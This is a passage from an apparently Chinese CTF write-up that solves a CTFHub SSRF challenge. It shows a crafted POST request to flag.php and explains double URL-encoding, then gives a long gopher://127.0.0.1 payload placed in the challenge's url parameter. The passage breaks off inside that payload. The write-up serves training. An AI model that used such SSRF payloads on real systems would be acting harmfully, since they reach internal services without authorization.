src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949638.png"></p><p>并且说“只需从 127.0.0.1 查看”</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949207.png"></p><p>结合题目，应该是需要我们用gopher协议去用post方法传递key到flag.php，不过需要注意的是要从127.0.0.1发送数据。</p><p>那我们重新在框里传输key值，不过这次我们用来抓包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949536.png"></p><p>删除多余数据。</p><p>注意：</p><p>确保Content-Length和下面数据的长度一致（不乱改，维持原状就可以）；</p><p>请求头与传递的参数（下面的key）之间一定要有换行符</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949552.png"></p><p>这里大家不能直接用我构造的，每个人传递的key可能不同。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/flag.php</span> HTTP<span class="hljs-symbol">/1.1</span><br> <br><span class="hljs-params">Host:</span> challenge-<span class="hljs-number">2784</span>d5d9d94613d0.sandbox.ctfhub.com:<span class="hljs-number">10800</span><br> <br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br> <br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">36</span><br> <br> <br><span class="hljs-attr">key</span><span class="hljs-operator">=</span>e0ea8453fe2a0f39ed46ccf5326bcde1<br></code></pre></td></tr></table></figure><p>然后我们选中修改后的抓包，进行两次URL编码</p><p>这是第一次</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949730.png"></p><p>这是第二次</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949228.png"></p><p>注意：使用以上这种方式编码就行，不要使用在线URL编码网站。</p><p>回车换行要变成%0d%0a，但直接使用在线工具转，可能只有%0a，还得自己再处理。</p><p>也不要去使用bp专门的Decoder编码，作者尝试过会失败。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949551.png"></p><p>然后我们构造gopher协议。</p><p>gopher协议需要有端口号，而且默认忽略的第一个字符，所以我们需要先写一个填充位，这里我们用下划线“_“填充。</p><p>这里注意只需要一个填充位即可，有时候复制我们payload时，前面会自动带一个空格，那样就有一个下划线加一个空格，要注意删掉。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>大家在构造时一定要注意四点：</p><ol><li>POST传参符合规范（格式符合、数据长度一致）</li><li>URL编码符合规范</li><li>带端口号</li><li>有且仅有一个填充位</li></ol><p>然后我们输入构造的gopher协议</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">2784</span>d5d9d94613d0.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=gopher://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span 